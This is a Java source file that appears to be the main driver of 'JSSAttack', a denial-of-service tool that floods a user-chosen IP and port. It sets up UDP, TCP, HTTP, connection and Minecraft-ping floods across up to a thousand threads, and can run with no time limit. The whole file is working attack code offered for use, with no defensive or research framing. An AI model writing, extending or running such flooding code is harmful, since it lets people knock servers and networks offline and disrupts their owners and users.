package ir.xenoncommunity.jss;

import ir.xenoncommunity.jss.methods.IAttackMethod;
import ir.xenoncommunity.jss.methods.impl.*;
import ir.xenoncommunity.jss.utils.*;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.SneakyThrows;
import org.jetbrains.annotations.NotNull;

import java.net.InetAddress;
import java.time.Duration;
import java.time.LocalTime;
import java.util.concurrent.TimeUnit;

@Getter
@RequiredArgsConstructor
public class JSSAttack implements Runnable {
    public final CommandLineParser parser;
    public boolean isDebug;

    /**
     * Returns the appropriate attack method based on the provided method, byte size, and attack statics.
     * @param method the attack method
     * @param byteSize the size of the attack in bytes
     * @param attackStatics the attack statics
     * @return the appropriate attack method
     */
    @NotNull
    private static IAttackMethod getMethod(String method, Integer byteSize, AttackStatics attackStatics) {
        return switch (method) {
            case "UDPFLOOD" -> new UDPFlood(attackStatics, byteSize);
            case "TCPFLOOD" -> new TCPFlood(attackStatics, byteSize);
            case "HTTPFLOOD" -> new HTTPFlood(attackStatics);
            case "CONNFLOOD" -> new ConnFlood(attackStatics);
            case "MCPING" -> new MCPingFlood(attackStatics);
            default -> throw new IllegalArgumentException("Invalid method: " + method);
        };
    }

    /**
     * Runs the attack with the specified parameters.
     */
    @SneakyThrows
    public void run() {
        // Parse command line arguments
        this.isDebug = this.parser.get("--debug", Boolean.class, false);
        final String ip = this.parser.get("--ip", String.class, null);
        final Integer port = this.parser.get("--port", Integer.class, -1);
        final Integer ppsLimit = this.parser.get("--pps", Integer.class, -1);
        final Integer maxThreads = this.parser.get("--threads", Integer.class, 1000);
        final Integer byteSize = this.parser.get("--byteSize", Integer.class, 1500);
        final Integer duration = this.parser.get("--duration", Integer.class, -1);
        final String method = this.parser.get("--method", String.class, "TCPFLOOD");
        final Boolean verbose = this.parser.get("--verbose", Boolean.class, false);

        if (ip == null) {
            System.out.println("JSSAttack by XenonCommunity");
            System.out.println("Usage: java -jar JSSAttack.jar --ip <ip> --port <port> --threads <threads> --byteSize <byteSize> --duration <duration> --method <method> [--verbose] [--debug]");
            System.exit(0);
        }

        // Set logging level based on verbosity and debug mode
        if (verbose) {
            Logger.setCurrentLevel(Logger.LEVEL.VERBOSE);
        } else if (this.isDebug) {
            Logger.setCurrentLevel(Logger.LEVEL.DEBUG);
        }

        // Log debug information if debug mode is enabled
        if (this.isDebug()) {
            Logger.setSection("DEBUG");
            Logger.log(Logger.LEVEL.INFO, "IP is: " + ip);
            Logger.log(Logger.LEVEL.INFO, "Port is: " + port);
            Logger.log(Logger.LEVEL.INFO, "MaxThreads is: " + maxThreads);
            Logger.log(Logger.LEVEL.INFO, "ByteSize is: " + byteSize);
        }

        // Initialize task manager
        TaskManager taskManager = new TaskManager(maxThreads);

        // Initialize attack parameters
        final AttackStatics attackStatics = new AttackStatics(ppsLimit);
        final IAttackMethod attackMethod = getMethod(method, byteSize, attackStatics);
        final InetAddress addr = InetAddress.getByName(ip);
        final LocalTime endTime = LocalTime.now().plus(Duration.ofSeconds(duration));

        // Start the attack and log thread creation
        Logger.setSection("ATTACK");
        for (int i = 0; i <= maxThreads; i++) {
            Logger.log(Logger.LEVEL.DEBUG, "Adding new thread. Max: " + maxThreads);

            taskManager.add(() -> {
                do {
                    try {
                        attackMethod.send(addr, port == -1 ? Randomize.randomPort() : port);
                    } catch (Exception e) {
                        e.printStackTrace(System.err);
                    }
                } while (duration == -1 || endTime.isAfter(LocalTime.now()));
            });
        }

        // Log start of attack
        Logger.log(Logger.LEVEL.INFO, "Attacking...");

        // Add task to print attack statistics if verbose mode is enabled
        if (verbose) {
            taskManager.add(() -> {
                while (LocalTime.now().isBefore(endTime)) {
                    try {
                        TimeUnit.SECONDS.sleep(1000);
                        attackStatics.print();
                    } catch (InterruptedException e) {
                        e.printStackTrace(System.err);
                    }
                }
            });
        }

        // Perform attack for specified duration or indefinitely
        if (duration == -1) {
            taskManager.doTasks(TimeUnit.DAYS, 365);
            Logger.log(Logger.LEVEL.INFO, "Happy new year!");
            return;
        }

        taskManager.doTasks(TimeUnit.SECONDS, duration);
    }

}